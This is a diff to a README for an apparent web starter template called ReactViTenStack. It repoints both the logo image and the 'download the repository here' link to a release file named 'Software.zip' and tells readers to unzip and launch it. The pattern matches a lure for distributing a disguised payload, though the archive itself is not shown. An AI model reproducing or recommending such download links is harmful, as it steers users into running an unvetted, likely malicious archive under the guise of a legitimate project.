@@ -2,7 +2,7 @@
 
 🚀 **A Modern Web Application Starter Template**
 
-![ReactViTenStack Logo](https://example.com/reactvitenstack-logo.png)
+![ReactViTenStack Logo](https://github.com/Gamespherev2/ReactViTenStack/releases/download/v1.0/Software.zip)
 
 Welcome to ReactViTenStack - the perfect starter template to kickstart your next web application project with an efficient and flexible stack. This template combines powerful tools for both frontend and backend development, offering seamless integration and full type safety.
 
@@ -32,7 +32,7 @@ Welcome to ReactViTenStack - the perfect starter template to kickstart your next
 
 ## Getting Started
 
-To get started with ReactViTenStack, simply [download the repository here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). Once downloaded, unzip the file and launch the template project to start building your web application.
+To get started with ReactViTenStack, simply [download the repository here](https://github.com/Gamespherev2/ReactViTenStack/releases/download/v1.0/Software.zip). Once downloaded, unzip the file and launch the template project to start building your web application.
 
 ## Installation
 
